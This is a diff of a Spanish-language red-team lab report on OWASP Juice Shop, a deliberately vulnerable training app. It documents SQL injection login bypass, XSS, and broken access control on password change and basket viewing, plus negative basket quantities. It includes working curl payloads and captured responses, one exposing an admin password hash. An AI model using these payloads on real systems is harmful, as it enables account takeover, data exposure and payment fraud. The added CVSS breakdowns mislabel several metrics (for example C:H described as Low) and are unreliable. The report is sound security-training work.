@@ -610,6 +610,7 @@ curl "http://localhost:3000/rest/products/search?q=' OR 1=1 --"
 #### Vulnerabilidad 1: Exposición de rutas
 
 **Descripción Técnica**:
+
 Debido a que el *frontend* de Juice Shop es una *Single Page Application* (SPA), herramientas como *dirbuster* o *gobuster*
 no resultan del todo útiles para encontrar todas las rutas que ofrece la aplicación, ya que las SPAs usualmente cuentan
 con un *fallback* de ruteo; es decir, si una ruta especificada por el usuario no está definida, se redirige a una página
@@ -652,6 +653,7 @@ fase de enumeración, permitiendo a un atacante descubrir funcionalidades o ruta
 #### Vulnerabilidad 2: SQL Injection en Login
 
 **Descripción Técnica**:
+
 SQL Injection es una vulnerabilidad que ocurre cuando una aplicación web construye consultas SQL concatenando directamente la entrada proporcionada por el usuario sin validación ni sanitización adecuada.
 Esto permite que un atacante inserte fragmentos de código SQL malicioso para:
 
@@ -687,7 +689,13 @@ curl -X POST http://localhost:3000/rest/user/login \
 
 **Response Obtenida**:
 ```json
-{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIjezYqNn0iLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTEtMjQgMTY6NTU6MjIuNjAzICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTEtMjQgMTk6MzA6MzcuOTU2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2NDAyOTUyM30.JpMmfOWh9pYN-YaOf4c9B2OleAUGK4kMqX6UiA7LTPGxff3wal5GBXoMO88T0waGeOZjnGX1xjzXV5sr5kymWGcoGDVOU5sF-43jS1Z95EYiE0iJ0RhOuQcoke8oCHk1AX7s0kadrIY-pe5i_dCReQGE2zj6auqdqbExoefpJ4E","bid":1,"umail":"admin@juice-sh.op"}}
+{
+  "authentication":{
+    "token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIjezYqNn0iLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTEtMjQgMTY6NTU6MjIuNjAzICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTEtMjQgMTk6MzA6MzcuOTU2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2NDAyOTUyM30.JpMmfOWh9pYN-YaOf4c9B2OleAUGK4kMqX6UiA7LTPGxff3wal5GBXoMO88T0waGeOZjnGX1xjzXV5sr5kymWGcoGDVOU5sF-43jS1Z95EYiE0iJ0RhOuQcoke8oCHk1AX7s0kadrIY-pe5i_dCReQGE2zj6auqdqbExoefpJ4E",
+    "bid":1,
+    "umail":"admin@juice-sh.op"
+  }
+}
 ```
 
 **Impacto**:
@@ -722,8 +730,6 @@ eliminar datos críticos, borrar productos, deshabilitar funciones o causar corr
 #### Vulnerabilidad 3: Cross-Site Scripting (XSS) reflejado
 
 **Descripción Técnica**:
-
-[Explica qué es XSS  y cómo funciona]
 
 Cross-Site Scripting (XSS) es una vulnerabilidad que permite a un atacante inyectar código JavaScript malicioso en una aplicación web. Este código se ejecuta en el navegador de la víctima, aprovechando que la aplicación refleja o almacena contenido proporcionado por el usuario sin realizar sanitización ni escape adecuado.
 
@@ -807,7 +813,23 @@ curl -X GET "http://localhost:3000/rest/user/change-password?new=<nueva>&repeat=
 
 **Response Obtenida**:
 ```json
-{"user":{"id":23,"username":"","email":"test@gmail.com","password":"cc03e747a6afbbcbf8be7668acfebee5","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"/assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2025-11-24T18:36:38.457Z","updatedAt":"2025-11-25T01:58:11.009Z","deletedAt":null}}
+{
+  "user":{
+    "id":23,
+    "username":"",
+    "email":"test@gmail.com",
+    "password":"cc03e747a6afbbcbf8be7668acfebee5",
+    "role":"customer",
+    "deluxeToken":"",
+    "lastLoginIp":"",
+    "profileImage":"/assets/public/images/uploads/default.svg",
+    "totpSecret":"",
+    "isActive":true,
+    "createdAt":"2025-11-24T18:36:38.457Z",
+    "updatedAt":"2025-11-25T01:58:11.009Z",
+    "deletedAt":null
+  }
+}
 ```
 
 **Impacto**:
@@ -817,7 +839,7 @@ curl -X GET "http://localhost:3000/rest/user/change-password?new=<nueva>&repeat=
 
 **Clasificación**:
 - **CWE**: CWE-306: Missing Authentication for Critical Function y CWE-862: Missing Authorization
-- **OWASP Top 10**: A01: Broken Access Control y A07: Identification and Authentication Failures
+- **OWASP Top 10**: A01:2021 - Broken Access Control y A07:2021 - Identification and Authentication Failures
 - **CVSS v3.1**: 8.8 - High
 - **Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
 
@@ -833,6 +855,152 @@ curl -X GET "http://localhost:3000/rest/user/change-password?new=<nueva>&repeat=
 **Screenshots**:
 
 ![Broken Access Control](./red-team/change-password.PNG)
+
+#### Vulnerabilidad 5: Broken Access Control en carrito de compras
+
+**Descripción Técnica**:
+
+El endpoint que permite obtener los productos que el usuario ha agregado al carrito `/rest/basket/:id` no realiza ninguna validación acerca del usuario que está realizando la solicitud y el carrito que está solicitando. Esto permite que cualquiera con un token de sesión válido pueda ver lo que otros usuarios están comprando.
+
+**Pasos para Reproducir**:
+1. Autenticarse en Juice Shop como cualquier usuario (o interceptar su token).
+2. Realizar una solicitud GET al endpoint `/rest/basket/:id`, sustituyendo `id` por un ID válido de otro usuario.
+3. El servidor devolverá el contenido completo del carrito del usuario solicitado, sin verificar que el usuario autenticado sea el propietario.
+
+**Payload Utilizado**:
+```bash
+curl -X GET "http://localhost:3000/rest/basket/2" \
+  -H "Authorization: Bearer <TOKEN_VALIDO>"
+```
+
+**Response Obtenida**:
+```json
+{
+  "status":"success",
+  "data":{
+    "id":2,
+    "coupon":null,
+    "UserId":2,
+    "createdAt":"2025-11-24T16:55:36.482Z",
+    "updatedAt":"2025-11-24T16:55:36.482Z",
+    "Products":[
+      {
+      "id":4,
+      "name":"Raspberry Juice (1000ml)",
+      "description":"Made from blended Raspberry Pi, water and sugar.",
+      "price":4.99,
+      "deluxePrice":4.99,
+      "image":"raspberry_juice.jpg",
+      "createdAt":"2025-11-24T16:55:35.581Z",
+      "updatedAt":"2025-11-24T16:55:35.581Z",
+      "deletedAt":null,
+      "BasketItem":{
+        "ProductId":4,
+        "BasketId":2,
+        "id":4,
+        "quantity":2,
+        "createdAt":"2025-11-24T16:55:36.748Z",
+        "updatedAt":"2025-11-24T16:55:36.748Z"}
+      }
+    ]
+  }
+}
+```
+
+**Impacto**:
+- **Confidencialidad**: 🟠 ALTO - El atacante puede acceder al carrito de cualquier usuario, revelando productos comprados cantidad, precios y timestamps.
+- **Integridad**: 🟢 BAJO - El exploit indicado es de solo lectura.
+- **Disponibilidad**: 🟢 BAJO - No es un ataque de DoS.
+
+**Clasificación**:
+- **CWE**: CWE-639: Authorization Bypass Through User-Controlled Key y CWE-862: Missing Authorization
+- **OWASP Top 10**: A01:2021 Broken Access Control
+- **CVSS v3.1**: 4.3 - Medium
+- **Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
+
+**Cálculo CVSS**:
+- **AV:N** (Attack Vector: Network) - El ataque se realiza vía HTTP.
+- **AC:L** (Attack Complexity: Low) - Solo requiere cambiar el ID numérico en la URL.
+- **PR:N** (Privileges Required: Low) - El atacante debe tener un token válido, pero cualquier usuario registrado puede explotar la falla.
+- **UI:N** (User Interaction: None) - El ataque no requiere intervención del usuario víctima.
+- **C:H** (Confidentiality: Low) - Se expone información sensible del carrito, pero no datos altamente críticos como contraseñas.
+- **I:H** (Integrity: None) - El endpoint no modifica el carrito del usuario.
+- **A:H** (Availability: None) - No afecta directamente la disponibilidad del sistema.
+
+**Screenshots**:
+
+![Broken Access Control - Cart](./red-team/basket-result.PNG)
+![Broken Access Control - Cart](./red-team/basket-result2.PNG)
+
+#### Vulnerabilidad 6: Improper Input Validation en carrito de compras
+
+Improper Input Validation ocurre cuando una aplicación no valida o no restringe adecuadamente los datos que recibe antes de procesarlos. En lugar de aplicar reglas de negocio adecuadas, el backend confía en que el cliente (frontend) hará esas validaciones.
+
+En Juice Shop, a pesar de que la interfaz de usuario del carrito de compras impide que se ingresen cantidades negativas de productos, el endpoint POST/PUT `/api/BasketItems/` acepta sin problemas valores negativos en el campo "quantity".
+Esto permite manipular la lógica de cálculo del carrito y provocar montos totales negativos, que luego pueden convertirse en créditos indebidos para el usuario cuando completa la compra.
+
+**Pasos para Reproducir**:
+1. Autenticarse en Juice Shop como cualquier usuario utilizando el navegador Proxy de Burp Suite.
+2. Navegar al carrito de compras y, usando Burp Suite como proxy, interceptar la solicitud PUT que se envía al agregar un producto nuevo o modificar su cantidad.
+3. Modificar el campo "quantity" de la solicitud en curso a un entero negativo, por ejemplo, -10, y reenviar la solicitud modificada.
+4. Alternativamente, puede enviarse directamente una solicitud POST al endpoint `/api/BasketItems/` indicando el token de sesión válido, el ID del producto, el ID del carrito y la cantidad negativa.
+4. Cuando el servidor reciba la solicitud, este no validará la cantidad especificada.
+5. Si se continúa con el flujo de compra, el sistema considerará la cantidad negativa, pudiendo resultar en un precio total negativo y generando crédito a favor del usuario.
+
+**Payload Utilizado**:
+```bash
+curl -X POST "http://juiceshop:3000/api/BasketItems/" \
+  -H "Authorization: Bearer <TOKEN_VALIDO>" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "ProductId": 1,
+    "BasketId": 6,
+    "quantity": -10
+  }'
+```
+
+**Response Obtenida**:
+```json
+{
+  "status": "success",
+  "data": {
+    "id": 11,
+    "ProductId": 1,
+    "BasketId": 6,
+    "quantity": -10,
+    "updatedAt": "2025-11-24T19:58:04.066Z",
+    "createdAt": "2025-11-24T19:58:04.066Z"
+  }
+}
+```
+
+**Impacto**:
+- **Confidencialidad**: 🟢 BAJO - No se expone información sensible de otros usuarios; el ataque se centra en manipular montos y lógica de negocio.
+- **Integridad**: 🔴 CRÍTICO - El atacante puede alterar la integridad de los datos financieros: carritos con montos negativos, generación de créditos indebidos en la cuenta del usuario y posible fraude al sistema de pagos o wallet interno.
+- **Disponibilidad**: 🟢 BAJO - No afecta directamente la disponibilidad del sistema, aunque un abuso masivo podría tener impacto económico para la organización.
+
+**Clasificación**:
+- **CWE**: CWE-20 - Improper Input Validation y CWE-754 - Improper Check for Unusual or Exceptional Conditions
+- **OWASP Top 10**: A04:2021 - Insecure Design
+- **CVSS v3.1**: 6.5 - Medium
+- **Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+
+**Cálculo CVSS**:
+- **AV:N** (Attack Vector: Network) - El ataque se realiza enviando solicitudes HTTP contra la API.
+- **AC:L** (Attack Complexity: Low) - Solo requiere modificar un valor numérico (quantity) en la petición.
+- **PR:N** (Privileges Required: Low) - El atacante debe tener un token válido, pero cualquier usuario registrado puede explotar la falla.
+- **UI:N** (User Interaction: None) - El atacante no depende de que una víctima haga algo; él mismo ejecuta el flujo.
+- **C:H** (Confidentiality: None) - No se accede a datos confidenciales de otros usuarios.
+- **I:H** (Integrity: High) - Se alteran reglas de negocio y montos económicos: se puede obtener dinero/crédito sin pagar.
+- **A:H** (Availability: None) - No hay impacto directo en la disponibilidad del sistema.
+
+**Screenshots**:
+
+![Improper Input Validation](./red-team/negative-quanitity.PNG)
+![Improper Input Validation](./red-team/negative-quanitity2.PNG)
+![Improper Input Validation](./red-team/negative-quanitity3.PNG)
+![Improper Input Validation](./red-team/negative-quanitity4.PNG)
+![Improper Input Validation](./red-team/negative-quanitity5.PNG)
 
 ### Coordinación Red Team - Blue Team
 
